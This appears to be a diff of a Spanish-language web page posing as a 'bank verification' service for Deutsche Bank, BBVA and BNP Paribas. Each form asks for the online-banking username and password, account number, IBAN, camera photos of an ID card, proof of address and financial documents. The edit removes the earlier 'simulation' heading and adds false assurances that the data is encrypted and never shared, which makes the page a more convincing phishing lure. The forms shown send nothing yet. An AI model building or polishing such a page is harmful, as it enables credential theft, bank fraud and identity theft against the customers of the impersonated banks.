@@ -4,55 +4,112 @@
   <meta charset="UTF-8">
   <title>Verificación Bancaria</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #fff; margin: 20px; }
-    .accordion { border: 1px solid #000; margin-bottom: 10px; }
-    .accordion-header { padding: 10px; cursor: pointer; font-weight: bold; }
-    .accordion-content { display: none; padding: 10px; border-top: 1px solid #000; }
-    label { display: block; margin-top: 8px; }
+    body { font-family: Arial, sans-serif; background: #f4f6f9; margin: 20px; }
+    h1 { color: #003366; text-align: center; }
+    h3 { color: #555; text-align: center; }
+    .search-box { text-align: center; margin: 20px; }
+    input[type="text"] { padding: 8px; width: 300px; }
+    .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 400px; }
+    .accordion-header { padding: 15px; cursor: pointer; font-weight: bold; background: #e6f0ff; }
+    .accordion-content { display: none; padding: 15px; border-top: 1px solid #ccc; }
+    label { display: block; margin-top: 10px; }
+    input[type="file"] { margin-top: 5px; }
+    .note { font-size: 14px; color: #777; margin-top: 10px; }
+    .security-message { background: #003366; color: #fff; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; }
+    .inline-security { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 13px; color: #333; }
   </style>
 </head>
 <body>
 
-  <h2>Simulación de Verificación Bancaria</h2>
+  <!-- Encabezado con mensaje de seguridad -->
+  <h1>Verificación Bancaria</h1>
+  <div class="security-message">
+    🔒 Su seguridad es nuestra prioridad. Todos los datos ingresados están protegidos y nunca serán compartidos con terceros.
+  </div>
+  <h3>Seleccione su banco</h3>
 
-  <!-- Banco único -->
-  <div class="accordion">
-    <div class="accordion-header">Banco BBVA</div>
-    <div class="accordion-content">
-      <form>
-        <label>Usuario:
-          <input type="text" name="usuario">
-        </label>
-        <label>Contraseña:
-          <input type="password" name="contraseña">
-        </label>
-        <label>Número de cuenta principal:
-          <input type="text" name="cuenta_principal">
-        </label>
-        <label>IBAN:
-          <input type="text" name="iban">
-        </label>
-        <label>Foto carnet identidad (frontal):
-          <input type="file" name="id_frontal">
-        </label>
-        <label>Foto carnet identidad (trasera):
-          <input type="file" name="id_trasera">
-        </label>
-        <label>Comprobante de domicilio:
-          <input type="file" name="domicilio">
-        </label>
-        <label>Justificantes financieros (nómina, impuestos, ingresos):
-          <input type="file" name="financieros">
-        </label>
-      </form>
+  <!-- Barra de búsqueda -->
+  <div class="search-box">
+    <input type="text" id="searchInput" placeholder="Buscar país o banco...">
+  </div>
+
+  <!-- Ejemplo de bancos -->
+  <div id="accordionList">
+    <div class="accordion">
+      <div class="accordion-header">Alemania - Deutsche Bank</div>
+      <div class="accordion-content">
+        <form>
+          <label>Usuario: <input type="text"></label>
+          <label>Contraseña: <input type="password"></label>
+          <label>Cuenta principal: <input type="text"></label>
+          <label>IBAN: <input type="text"></label>
+          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
+          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
+          <div class="inline-security">🔒 No comparta sus credenciales en otras páginas. Este proceso se realiza únicamente en nuestro entorno seguro.</div>
+        </form>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <div class="accordion-header">España - BBVA</div>
+      <div class="accordion-content">
+        <form>
+          <label>Usuario: <input type="text"></label>
+          <label>Contraseña: <input type="password"></label>
+          <label>Cuenta principal: <input type="text"></label>
+          <label>IBAN: <input type="text"></label>
+          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
+          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
+          <div class="inline-security">🔒 Las imágenes se almacenan de forma cifrada y solo se utilizan para validar su identidad.</div>
+        </form>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <div class="accordion-header">Francia - BNP Paribas</div>
+      <div class="accordion-content">
+        <form>
+          <label>Usuario: <input type="text"></label>
+          <label>Contraseña: <input type="password"></label>
+          <label>Cuenta principal: <input type="text"></label>
+          <label>IBAN: <input type="text"></label>
+          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
+          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
+          <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
+        </form>
+      </div>
     </div>
   </div>
 
+  <!-- Pie de página con mensaje de seguridad -->
+  <div class="security-message">
+    🔒 Velamos por la protección de su información personal en cada paso. Sus datos nunca serán compartidos con terceros. Su seguridad primero.
+  </div>
+
   <script>
-    const header = document.querySelector(".accordion-header");
-    header.addEventListener("click", () => {
-      const content = header.nextElementSibling;
-      content.style.display = content.style.display === "block" ? "none" : "block";
+    // Función para desplegar acordeones
+    const headers = document.querySelectorAll(".accordion-header");
+    headers.forEach(header => {
+      header.addEventListener("click", () => {
+        const content = header.nextElementSibling;
+        content.style.display = content.style.display === "block" ? "none" : "block";
+      });
+    });
+
+    // Función de búsqueda
+    document.getElementById("searchInput").addEventListener("keyup", function() {
+      const filter = this.value.toLowerCase();
+      const accordions = document.querySelectorAll(".accordion");
+      accordions.forEach(acc => {
+        const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
+        acc.style.display = text.includes(filter) ? "" : "none";
+      });
     });
   </script>
 
